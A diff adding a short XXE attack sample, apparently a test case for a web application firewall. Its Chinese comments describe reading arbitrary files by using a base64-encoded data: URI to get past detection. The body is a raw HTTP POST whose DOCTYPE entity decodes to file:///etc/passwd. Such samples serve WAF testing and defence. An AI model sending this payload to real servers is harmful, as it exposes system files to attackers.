@@ -1,0 +1,11 @@
+# XML外部实体注入_文件读取_data协议(base64编码)
+# 攻击者通过构造此语句利用data协议和base64编码的方式绕过检测，读取任意文件内容
+POST /?bid=hd_tag_m8mv24mj HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24mj
+RM-PRO-Token: 4ad7bbd5e118192fd3ecfd36152d9757
+RM-PRO-Time: 1742808392914
+User-Agent: curl/7.83.1
+Content-Type: application/xml
+
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
